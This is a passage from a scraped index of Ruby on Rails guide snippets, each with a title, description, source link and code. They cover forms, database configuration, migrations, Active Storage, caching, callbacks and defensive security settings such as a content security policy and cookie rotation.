`application_helper.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nmodule ApplicationHelper\n  def text_field_with_label(form, attribute)\n    form.label(attribute) + form.text_field(attribute)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring MySQL/MariaDB Development Database (YAML)\nDESCRIPTION: This YAML snippet configures a MySQL or MariaDB database for the development environment in a Rails application. It specifies the adapter, encoding, database name, connection pool size, username, password, and socket.  It assumes a root user with an empty password; otherwise, the username and password should be updated.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_88\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: mysql2\n  encoding: utf8mb4\n  database: blog_development\n  pool: 5\n  username: root\n  password:\n  socket: /tmp/mysql.sock\n```\n\n----------------------------------------\n\nTITLE: Extending Production Environment in Staging (Ruby)\nDESCRIPTION: This Ruby snippet shows how to create a 'staging' environment in Rails by extending the 'production' environment configuration. It requires the production environment file and then allows for overriding specific configurations within the `Rails.application.configure` block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_101\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/staging.rb\nrequire_relative \"production\"\n\nRails.application.configure do\n  # Staging overrides\nend\n```\n\n----------------------------------------\n\nTITLE: Active Record Model Class Definition\nDESCRIPTION: This code defines the `Product` model class, which inherits from `ApplicationRecord`. Active Record automatically infers attributes and methods based on the database table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Trilogy Database Adapter in YAML\nDESCRIPTION: Example of configuring the new Trilogy MySQL-compatible database adapter in a Rails application's database.yml file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: trilogy\n  database: blog_development\n  pool: 5\n```\n\n----------------------------------------\n\nTITLE: Rollback latest migration\nDESCRIPTION: Illustrates how to rollback the latest migration using the `db:rollback` command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_64\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:rollback\n```\n\n----------------------------------------\n\nTITLE: Updating an Active Record Object Attribute in Ruby\nDESCRIPTION: Retrieves a single 'Book' record identified by its title \"The Lord of the Rings\" using `find_by`. It then modifies the 'title' attribute of the retrieved object and persists the change to the database using the `save` method, which also triggers validations and callbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nbook = Book.find_by(title: \"The Lord of the Rings\")\nbook.title = \"The Lord of the Rings: The Fellowship of the Ring\"\nbook.save\n```\n\n----------------------------------------\n\nTITLE: Products Controller Actions - Ruby\nDESCRIPTION: This Ruby snippet defines the `ProductsController` with actions for indexing, showing, creating, editing, and updating products. It includes methods for handling form submissions, saving records, and rendering appropriate views. It relies on the `product_params` method to sanitize input parameters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def index\n    @products = Product.all\n  end\n\n  def show\n    @product = Product.find(params[:id])\n  end\n\n  def new\n    @product = Product.new\n  end\n\n  def create\n    @product = Product.new(product_params)\n    if @product.save\n      redirect_to @product\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  def edit\n    @product = Product.find(params[:id])\n  end\n\n  def update\n    @product = Product.find(params[:id])\n    if @product.update(product_params)\n      redirect_to @product\n    else\n      render :edit, status: :unprocessable_entity\n    end\n  end\n\n  private\n    def product_params\n      params.expect(product: [ :name ])\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Errors with errors.add in Rails\nDESCRIPTION: This snippet demonstrates how to add custom errors using the errors.add method. It shows how to define a custom validator that adds a specific error type with a custom message.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_69\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validate do |person|\n    errors.add :name, :too_plain, message: \"is not cool enough\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Optimizing Active Storage Variant Queries in Ruby on Rails\nDESCRIPTION: This Ruby code snippet shows how to optimize database queries when loading multiple Active Storage variants, avoiding N+1 queries by using the with_all_variant_records scope.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\nmessage.images.with_all_variant_records.each do |file|\n  image_tag file.representation(resize_to_limit: [100, 100]).processed.url\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring MemCacheStore with Default Address\nDESCRIPTION: This snippet configures the MemCacheStore without specifying any server addresses. In this case, it will fallback to the `$MEMCACHE_SERVERS` environment variable, and then to `127.0.0.1:11211` if the environment variable is not set.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :mem_cache_store # Will fallback to $MEMCACHE_SERVERS, then 127.0.0.1:11211\n```\n\n----------------------------------------\n\nTITLE: Configure RedisCacheStore\nDESCRIPTION: This code configures the Rails application to use RedisCacheStore, specifying the Redis URL for connection.  It's placed in the `config/environments/*.rb` file. `ENV[\"REDIS_URL\"]` retrieves the Redis URL from the environment variables.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :redis_cache_store, { url: ENV[\"REDIS_URL\"] }\n```\n\n----------------------------------------\n\nTITLE: Attaching File Objects from Disk in Rails\nDESCRIPTION: Shows how to attach a file that exists on disk to a model record. This example opens a file and attaches it with a filename specification.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\n@message.images.attach(io: File.open(\"/path/to/file\"), filename: \"file.pdf\")\n```\n\n----------------------------------------\n\nTITLE: Form Generation with CSRF Token in Rails\nDESCRIPTION: Shows how to generate a form using form_with helper that automatically includes CSRF protection token.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_1\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @user do |form| %>\n  <%= form.text_field :username %>\n  <%= form.text_field :password %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Setting Redirect Status Code in Rails\nDESCRIPTION: This code snippet shows how to set the HTTP status code when using `redirect_to`. The example illustrates setting a permanent redirect (301) when redirecting to the photos path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nredirect_to photos_path, status: 301\n```\n\n----------------------------------------\n\nTITLE: Hash Stringify Keys Ruby\nDESCRIPTION: The `stringify_keys` method creates a new hash where all keys are strings. It's useful when you need to ensure keys are strings, regardless of whether they were originally symbols or strings. The `stringify_keys!` version modifies the hash in place. `deep_stringify_keys` and `deep_stringify_keys!` apply the conversion recursively to nested hashes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_129\n\nLANGUAGE: ruby\nCODE:\n```\ndef to_checkbox_tag(options = {}, checked_value = \"1\", unchecked_value = \"0\")\n  options = options.stringify_keys\n  options[\"type\"] = \"checkbox\"\n  # ...\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n{ nil => nil, 1 => 1, nested: { a: 3, 5 => 5 } }.deep_stringify_keys\n# => {\"\"=>nil, \"1\"=>1, \"nested\"=>{\"a\"=>3, \"5\"=>5}}\n```\n\n----------------------------------------\n\nTITLE: Using Autoloaded Constants in Rails Initializers\nDESCRIPTION: This example demonstrates how constants from autoload_once_paths can be safely used in Rails initializers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/custom_serializers.rb\nRails.application.config.active_job.custom_serializers << MoneySerializer\n```\n\n----------------------------------------\n\nTITLE: Configuring YAML Secrets File Structure\nDESCRIPTION: Example structure for the secrets.yml configuration file used to store application secrets across different environments\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_74\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  secret_key_base:\n\ntest:\n  secret_key_base:\n\nproduction:\n  secret_key_base: <%= ENV[\"SECRET_KEY_BASE\"] %>\n```\n\n----------------------------------------\n\nTITLE: Including Active Storage JavaScript for Direct Uploads\nDESCRIPTION: Shows different ways to include the Active Storage JavaScript library in a Rails application. Options include using JavaScript include tag, importmap-rails, asset pipeline, or npm package.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_60\n\nLANGUAGE: erb\nCODE:\n```\n<%= javascript_include_tag \"activestorage\" %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Amazon S3 Service with Options\nDESCRIPTION: Detailed YAML configuration for Amazon S3 service with additional client and upload options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\namazon:\n  service: S3\n  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>\n  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>\n  region: \"\" # e.g. 'us-east-1'\n  bucket: your_own_bucket-<%= Rails.env %>\n  http_open_timeout: 0\n  http_read_timeout: 0\n  retry_limit: 0\n  upload:\n    server_side_encryption: \"\" # 'aws:kms' or 'AES256'\n    cache_control: \"private, max-age=<%= 1.day.to_i %>\"\n```\n\n----------------------------------------\n\nTITLE: Permitting the Featured Image Parameter - Ruby\nDESCRIPTION: This code updates the `product_params` method in the `ProductsController` to permit the `featured_image` parameter.  This allows the uploaded featured image to be saved with the product.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_85\n\nLANGUAGE: ruby\nCODE:\n```\n    # Only allow a list of trusted parameters through.\n    def product_params\n      params.expect(product: [ :name, :description, :featured_image ])\n    end\n```\n\n----------------------------------------\n\nTITLE: Configuring Content-Security-Policy in Ruby on Rails\nDESCRIPTION: This snippet shows how to configure the Content-Security-Policy header using Rails' DSL in an initializer file. It sets various directives to enhance security against XSS and injection attacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_68\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/content_security_policy.rb\nRails.application.config.content_security_policy do |policy|\n  policy.default_src :self, :https\n  policy.font_src    :self, :https, :data\n  policy.img_src     :self, :https, :data\n  policy.object_src  :none\n  policy.script_src  :self, :https\n  policy.style_src   :self, :https\n  # Specify URI for violation reports\n  policy.report_uri \"/csp-violation-report-endpoint\"\nend\n```\n\n----------------------------------------\n\nTITLE: Downloading Active Storage Blobs in Ruby\nDESCRIPTION: These code snippets demonstrate how to download Active Storage blobs, either into memory or to a temporary file on disk for processing by external programs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nbinary = user.avatar.download\n```\n\nLANGUAGE: ruby\nCODE:\n```\nmessage.video.open do |file|\n  system \"/path/to/virus/scanner\", file.path\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing Unique Constraints with Encrypted Attributes\nDESCRIPTION: Shows how to implement unique validations with deterministically encrypted attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  validates :email_address, uniqueness: true\n  encrypts :email_address, deterministic: true, downcase: true\nend\n```\n\n----------------------------------------\n\nTITLE: Multiple Association Callbacks: before_add with array in Rails\nDESCRIPTION: This example shows how to use an array of callbacks for the `before_add` association callback.  The `check_limit` and `calculate_shipping_charges` methods will be executed before a book is added to the author's collection. The object being added or removed is passed to the callback.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, before_add: [:check_limit, :calculate_shipping_charges]\n\n  def check_limit(_book)\n    if books.count >= 5\n      errors.add(:base, \"Cannot add more than 5 books for this author\")\n      throw(:abort)\n    end\n  end\n\n  def calculate_shipping_charges(book)\n    weight_in_pounds = book.weight_in_pounds || 1\n    shipping_charges = weight_in_pounds * 2\n\n    shipping_charges\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Response Headers - Rails\nDESCRIPTION: This snippet shows how to set a custom HTTP response header using the `response.headers` hash. It allows adding or modifying headers to customize the response sent to the client.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nresponse.headers[\"X-Custom-Header\"] = \"some value\"\n```\n\n----------------------------------------\n\nTITLE: Partial with Conditional Logic (_article.html.erb)\nDESCRIPTION: This snippet demonstrates a partial that uses `local_assigns` to conditionally render the full or truncated body of an article based on the presence and value of the `full` local variable. It utilizes `simple_format` to preserve line breaks in the full body and `truncate` to shorten the body if `full` is not true.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_81\n\nLANGUAGE: html+erb\nCODE:\n```\n<h2><%= article.title %></h2>\n\n<% if local_assigns[:full] %>\n  <%= simple_format article.body %>\n<% else %>\n  <%= truncate article.body %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Rotating Signed Cookie Digests in Rails\nDESCRIPTION: This snippet shows how to set up cookie rotation to seamlessly upgrade existing signed cookies from SHA1 to SHA256 without invalidating them. This allows for a smooth transition to more secure digest algorithms.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.action_dispatch.cookies_rotations.tap do |cookies|\n  cookies.rotate :signed, digest: \"SHA1\"\nend\n```\n\n----------------------------------------\n\nTITLE: Table Schema with Custom Primary Key (Ruby)\nDESCRIPTION: This shows the schema creation with the custom primary key `user_id`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_31\n\nLANGUAGE: Ruby\nCODE:\n```\ncreate_table \"users\", primary_key: \"user_id\", force: :cascade do |t|\n  t.string \"username\"\n  t.string \"email\"\n  t.datetime \"created_at\", precision: 6, null: false\n  t.datetime \"updated_at\", precision: 6, null: false\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering a Collection of Partials (index.html.erb)\nDESCRIPTION: This code snippet demonstrates how to render a collection of partials using the `:collection` option. For each `product` in the `@products` collection, the `_product.html.erb` partial will be rendered.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_84\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>Products</h1>\n<%= render partial: \"product\", collection: @products %>\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Drag and Drop File Uploads with DirectUpload\nDESCRIPTION: This JavaScript snippet shows how to use the DirectUpload class to implement custom drag and drop file uploads. It handles both drag-and-drop and normal file selection events.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_72\n\nLANGUAGE: javascript\nCODE:\n```\nimport { DirectUpload } from \"@rails/activestorage\"\n\nconst input = document.querySelector('input[type=file]')\n\n// Bind to file drop - use the ondrop on a parent element or use a\n//  library like Dropzone\nconst onDrop = (event) => {\n  event.preventDefault()\n  const files = event.dataTransfer.files;\n  Array.from(files).forEach(file => uploadFile(file))\n}\n\n// Bind to normal file selection\ninput.addEventListener('change', (event) => {\n  Array.from(input.files).forEach(file => uploadFile(file))\n  // you might clear the selected files from the input\n  input.value = null\n})\n\nconst uploadFile = (file) => {\n  // your form needs the file_field direct_upload: true, which\n  //  provides data-direct-upload-url\n  const url = input.dataset.directUploadUrl\n  const upload = new DirectUpload(file, url)\n\n  upload.create((error, blob) => {\n    if (error) {\n      // Handle the error\n    } else {\n      // Add an appropriately-named hidden input to the form with a\n      //  value of blob.signed_id so that the blob ids will be\n      //  transmitted in the normal upload flow\n      const hiddenField = document.createElement('input')\n      hiddenField.setAttribute(\"type\", \"hidden\");\n      hiddenField.setAttribute(\"value\", blob.signed_id);\n      hiddenField.name = input.name\n      document.querySelector('form').appendChild(hiddenField)\n    }\n  })\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Form with form_with - ERB\nDESCRIPTION: This snippet demonstrates the basic usage of the `form_with` helper in ERB to create an HTML form. When called without arguments, it generates a POST form that submits to the current page. It automatically includes an authenticity token for CSRF protection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_0\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with do |form| %>\n  Form contents\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Enabling API-Only Mode - Rails Configuration - Ruby\nDESCRIPTION: Enables Rails API-only mode by setting the config.api_only flag to true in config/application.rb. This removes unnecessary middleware and enables a streamlined Rails stack suitable for building APIs. No parameters are required, but must be placed inside the Application class definition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.api_only = true\n```\n\n----------------------------------------\n\nTITLE: Proper Translation Abstraction with Variable Interpolation\nDESCRIPTION: Example showing correct abstraction for internationalization using variable interpolation, which allows for proper handling of different word orders and formats across languages.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_25\n\nLANGUAGE: html+erb\nCODE:\n```\n<!-- app/views/products/show.html.erb -->\n<%= t('product_price', price: @product.price) %>\n```\n\n----------------------------------------\n\nTITLE: Form with _destroy Checkbox for Removing Associated Objects in Rails\nDESCRIPTION: This ERB snippet demonstrates how to add a checkbox to the nested form that allows users to mark associated `Address` records for deletion. The `_destroy` attribute is a special attribute recognized by `accepts_nested_attributes_for` when `allow_destroy: true` is set.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_83\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @person do |form| %>\n  Addresses:\n  <ul>\n    <%= form.fields_for :addresses do |addresses_form| %>\n      <li>\n        <%= addresses_form.checkbox :_destroy %>\n        <%= addresses_form.label :kind %>\n        <%= addresses_form.text_field :kind %>\n        ...\n      </li>\n    <% end %>\n  </ul>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Combining Create and Update Callbacks\nDESCRIPTION: Demonstrates how to use a combination of after_create and after_update callbacks in a Rails ActiveRecord model. The after_create callback is used to send a confirmation email when a user is created, and the after_update callback is used to notify an admin if critical information is updated.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  after_create :send_confirmation_email\n  after_update :notify_admin_if_critical_info_updated\n\n  private\n    def send_confirmation_email\n      UserMailer.confirmation_email(self).deliver_later\n      Rails.logger.info(\"Confirmation email sent to: #{email}\")\n    end\n\n    def notify_admin_if_critical_info_updated\n      if saved_change_to_email? || saved_change_to_phone_number?\n        AdminMailer.user_critical_info_updated(self).deliver_later\n        Rails.logger.info(\"Notification sent to admin about critical info update for: #{email}\")\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Ordering by Multiple Fields in Rails\nDESCRIPTION: Demonstrates ordering by multiple fields, specifying the sort order for each field. Different syntaxes are used, including symbol-based and string-based ordering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_81\n\nLANGUAGE: ruby\nCODE:\n```\nBook.order(title: :asc, created_at: :desc)\n# OR\nBook.order(:title, created_at: :desc)\n# OR\nBook.order(\"title ASC, created_at DESC\")\n# OR\nBook.order(\"title ASC\", \"created_at DESC\")\n```\n\n----------------------------------------\n\nTITLE: Setting Default URL Options for Locale in Ruby on Rails\nDESCRIPTION: Overrides the default_url_options method in ApplicationController to include the current locale in all URL helpers, ensuring the locale is passed through requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/application_controller.rb\ndef default_url_options\n  { locale: I18n.locale }\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Absolute URLs with Helper in Email Template (ERB)\nDESCRIPTION: This snippet uses the welcome_url helper within a link_to call to generate a full URL for email links. This ensures links are fully qualified for use in emails, which lack a request context. It assumes that default_url_options[:host] has been set.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_18\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= link_to 'welcome', welcome_url %>\n```\n\n----------------------------------------\n\nTITLE: Rails Before Initialize Hook - Ruby\nDESCRIPTION: This code snippet demonstrates how to use the `before_initialize` hook within a `Rails::Application` subclass to execute code before the Rails application is initialized. The code to be executed is placed within the `do...end` block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_108\n\nLANGUAGE: ruby\nCODE:\n```\nmodule YourApp\n  class Application < Rails::Application\n    config.before_initialize do\n      # initialization code goes here\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: System Test for Creating an Article (Ruby)\nDESCRIPTION: This Ruby code provides a system test for creating a new article. It visits the articles index page, clicks on a \"New Article\" link, fills in the title and body fields, clicks on the \"Create Article\" button, and asserts that the title of the new article is displayed on the page. Relies on capybara assertions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"should create Article\" do\n  visit articles_path\n\n  click_on \"New Article\"\n\n  fill_in \"Title\", with: \"Creating an Article\"\n  fill_in \"Body\", with: \"Created this article successfully!\"\n\n  click_on \"Create Article\"\n\n  assert_text \"Creating an Article\"\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Mountable Rails Engine\nDESCRIPTION: Command to generate a new mountable Rails engine using the plugin generator with the --mountable option\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails plugin new blorgh --mountable\n```\n\n----------------------------------------\n\nTITLE: Removing Attachments Synchronously in Rails\nDESCRIPTION: Shows how to synchronously remove an attachment from a model by calling the purge method, which deletes both the database record and the actual file from storage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\n# Synchronously destroy the avatar and actual resource files.\nuser.avatar.purge\n```\n\n----------------------------------------\n\nTITLE: Form Select with Manual Options\nDESCRIPTION: This erb snippet uses form_with and a form builder to create a select box for selecting a city.  The options are manually constructed by mapping city name and ID.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_50\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @person do |form| %>\n  <%= form.select :city_id, City.order(:name).map { |city| [city.name, city.id] } %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Generating URL for Attachment in Rails\nDESCRIPTION: Shows how to generate a permanent URL for a blob using the url_for helper, which creates a URL with the blob's signed_id that redirects to the actual file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nurl_for(user.avatar)\n# => https://www.example.com/rails/active_storage/blobs/redirect/:signed_id/my-avatar.png\n```\n\n----------------------------------------\n\nTITLE: Secure Regular Expression Pattern for URL Validation\nDESCRIPTION: A secure version of the URL validation pattern using \\A and \\z to properly match the beginning and end of the entire string in Ruby, preventing multi-line injection attacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\n/\\Ahttps?:\\/\\/[^\\n]+\\z/i\n```\n\n----------------------------------------\n\nTITLE: Creating File Field for Attachment in Rails View (ERB)\nDESCRIPTION: Adds a file field for selecting an avatar file within a Rails view (typically a form for a User model). This leverages form builders to allow users to upload files. No external dependencies required.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_15\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.file_field :avatar %>\n```\n\n----------------------------------------\n\nTITLE: Iterate with a Custom Start ID using `find_each` in Ruby\nDESCRIPTION: This snippet demonstrates how to use the `:start` option with `find_each` to begin iteration from a specific primary key. Here, iteration begins with customer ID 2000.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_each(start: 2000) do |customer|\n  NewsMailer.weekly(customer).deliver_now\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Equivalent: Find Customers by IDs (Multiple)\nDESCRIPTION: SQL query equivalent to the ActiveRecord `Customer.find([1, 10])` call. It selects all columns from the `customers` table where the `id` is in the set (1, 10).  This demonstrates the underlying SQL generated when finding multiple records by id.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (customers.id IN (1,10))\n```\n\n----------------------------------------\n\nTITLE: Creating an Email Interceptor in Ruby on Rails\nDESCRIPTION: This code creates an email interceptor class that modifies the recipient of all outgoing emails to a sandbox address. It's useful for testing or staging environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nclass SandboxEmailInterceptor\n  def self.delivering_email(message)\n    message.to = [\"sandbox@example.com\"]\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Executing Raw SQL with 'reversible' for View Creation in Rails Migrations\nDESCRIPTION: This snippet demonstrates how to use 'reversible' with 'execute' to create and drop a database view within a Rails migration.  It ensures the view creation and removal are correctly handled during both migration and rollback.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\nclass ExampleMigration < ActiveRecord::Migration[8.1]\n  def change\n    create_table :distributors do |t|\n      t.string :zipcode\n    end\n\n    reversible do |direction|\n      direction.up do\n        # create a distributors view\n        execute <<-SQL\n          CREATE VIEW distributors_view AS\n          SELECT id, zipcode\n          FROM distributors;\n        SQL\n      end\n      direction.down do\n        execute <<-SQL\n          DROP VIEW distributors_view;\n        SQL\n      end\n    end\n\n    add_column :users, :address, :string\n  end\nend\n```\n\nLANGUAGE: sql\nCODE:\n```\nCREATE VIEW distributors_view AS\nSELECT id, zipcode\nFROM distributors;\n```\n\nLANGUAGE: sql\nCODE:\n```\nDROP VIEW distributors_view;\n```\n\n----------------------------------------\n\nTITLE: Inserting middleware after another in Rails\nDESCRIPTION: Demonstrates inserting a custom middleware (`Magical::Unicorns`) after another existing middleware (`Rack::Head`) in the Rails middleware stack using `config.middleware.insert_after`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.insert_after Rack::Head, Magical::Unicorns\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Root Namespaces\nDESCRIPTION: Configuration for setting up custom root namespaces with backwards compatibility for Rails < 7.1.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/autoloading.rb\n\nmodule Services; end\n\nRails.autoloaders.main.push_dir(\"#{Rails.root}/app/services\", namespace: Services)\n\n# Additional code for applications running on Rails < 7.1.\napp_services_dir = \"#{Rails.root}/app/services\" # has to be a string\nActiveSupport::Dependencies.autoload_paths.delete(app_services_dir)\nRails.application.config.watchable_dirs[app_services_dir] = [:rb]\n```\n\n----------------------------------------\n\nTITLE: Collection Select Using form builder\nDESCRIPTION: This snippet demonstrates the usage of `collection_select` helper in Rails form to generate a select box from a collection. It uses `City.order(:name)` as the collection, `:id` as the value method, and `:name` as the text label method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_52\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.collection_select :city_id, City.order(:name), :id, :name %>\n```\n\n----------------------------------------\n\nTITLE: Rendering Flash Messages in Layout - ERB\nDESCRIPTION: This snippet shows how to render flash messages in the application layout using ERB. It iterates through each key-value pair in the `flash` hash and outputs a `div` tag with the key as the class name and the value as the message.  The layout ensures messages are consistently rendered.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_30\n\nLANGUAGE: erb\nCODE:\n```\n<html>\n  <!-- <head/> -->\n  <body>\n    <% flash.each do |name, msg| -%>\n      <%= content_tag :div, msg, class: name %>\n    <% end -%>\n\n    <!-- more content -->\n    <%= yield %>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Generating Migration with NOT NULL Constraint (Shell)\nDESCRIPTION: This command generates a migration to add an `email` (string) column with a `NOT NULL` constraint to the `users` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_24\n\nLANGUAGE: Shell\nCODE:\n```\n$ bin/rails 